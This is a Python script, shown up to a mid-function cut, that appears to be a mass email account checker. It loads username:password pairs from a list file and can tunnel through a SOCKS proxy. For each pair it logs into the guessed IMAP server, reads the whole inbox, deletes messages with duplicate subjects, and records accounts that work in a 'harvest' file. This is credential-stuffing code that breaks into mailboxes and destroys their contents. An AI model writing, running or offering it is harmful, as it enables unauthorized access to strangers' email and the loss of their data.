import imaplib
import email
import threading
import queue
import time
import socket
import socks
import re

# Proxy details (optional)
use_proxy = False
proxy_type = socks.SOCKS5
proxy_addr = "proxy.example.com"
proxy_port = 1080
proxy_username =""
proxy_password =""

# Store the email addresses and passwords in a queue
credential_queue = queue.Queue()
with open("list.txt") as credentials:
    for line in credentials:
        username, password = line.strip().split(":")
        credential_queue.put((username, password))

# The function to check an email address
def check_email(credential_queue):
    while not credential_queue.empty():
        username, password = credential_queue.get()
        print("Checking email:", username)

        # Extract the domain from the email address
        domain = re.findall(r"@(.+?)\.", username)[0]

        # Build the IMAP server URL
        imap_server = "imap." + domain

        # Connect to the IMAP server
        if use_proxy:
            socks.set_default_proxy(proxy_type, proxy_addr, proxy_port)
            socket.socket = socks.socksocket
        mail = imaplib.IMAP4_SSL(imap_server)
        try:
            mail.login(username, password)

            # Select the mailbox you want to retrieve emails from
            mail.select("inbox")

            # Search for all emails
            status, email_ids = mail.search(None, "ALL")
            email_ids = email_ids[0].split()

            # Store the subjects of all emails in a set
            subjects = set()
            for email_id in email_ids:
                status, email_data = mail.fetch(email_id, "(RFC822)")
                email_message = email.message_from_bytes(email_data[0][1])
                subjects.add(email_message["Subject"])

            # Search for the emails with duplicate subjects and remove them
            duplicates = []
            for email_id in email_ids:
                status, email_data = mail.fetch(email_id, "(RFC822)")
                email_message = email.message_from_bytes(email_data[0][1])
                if email_message["Subject"] in subjects:
                    subjects.remove(email_message["Subject"])
                else:
                    duplicates.append(email_message["Subject"])
                    mail.store(email_id, "+FLAGS", "\\Deleted")

            # Expunge the mailbox to remove the emails marked as deleted
            mail.expunge()

            # Logout from the IMAP server
            mail.logout()

            # Store the email address in the harvest file
            with open("harvest.txt", "a") as harvest_file:
                harvest_file.write(username + "\n")

            # Store the duplicates in the duplicates file
            if duplicates:
                with open("duplicates.txt", "a") as duplicates_file:
                    for duplicate in duplicates:
